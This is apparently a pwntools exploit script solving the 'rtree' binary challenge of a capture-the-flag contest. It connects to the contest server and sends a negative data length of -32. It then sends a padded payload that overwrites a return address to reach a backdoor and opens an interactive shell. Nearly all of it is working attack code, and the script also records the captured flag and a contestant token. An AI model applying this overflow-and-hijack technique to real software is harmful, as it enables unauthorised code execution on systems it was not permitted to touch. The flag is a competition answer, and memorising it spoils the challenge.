from pwn import *

conn = remote('prob12.geekgame.pku.edu.cn', '10012')
# conn = process('./rtree')
# gdb.attach(proc.pidof(conn)[0])

print(conn.recvuntil(b'token: '), end = '>\n')
conn.sendline(b'165:MEQCIAO8Cvf2ewr9c8j2xJV-2MKt019qD2WRxsITgGZxEv-aAiApyfqPGe_LnG5HPuSqMFZzFLumbfL6yfGLiFS2WrnJQw==')

print(conn.recvuntil(b'quit'), end = '>\n')
conn.sendline(b'1')
print(conn.recvuntil(b'key:'), end = '>\n')
conn.sendline(b'1')
print(conn.recvuntil(b'data:'), end = '>\n')
conn.sendline(b'64')
print(conn.recvuntil(b'data:'), end = '>\n')
conn.sendline(b'1' * 64)

print(conn.recvuntil(b'quit'), end = '>\n')
conn.sendline(b'1')
print(conn.recvuntil(b'key:'), end = '>\n')
conn.sendline(b'2')
print(conn.recvuntil(b'data:'), end = '>\n')
conn.sendline(b'-32')
print(conn.recvuntil(b'data:'), end = '>\n')
conn.sendline(b'\x00\x00\x00\x00\x00\x00\x00\x00' * 51 + b'\x43\x12\x40\x00\x00\x00\x00\x00')
print(conn.recvuntil(b'quit'), end = '>\n')

conn.interactive()
# flag{c0ngr4ts_0n_F1NDinG_Th3_bACKD00R}


# conn.sendline(b'4')
# conn.sendline(b'ls')
# conn.sendline(b'cat flag.txt')
# conn.sendline(b'cat /flag.txt')
# conn.sendline(b'ls')
# print(conn.recvuntil(b'backdoor!\n'), end = '$\n')
#print(conn.recvline())
#print(conn.recvline())
#print(conn.recvline())
#print(conn.recvline())
#print(conn.recvline())
#print(conn.recvline())
#print(conn.recvline())
#print(conn.recvline())
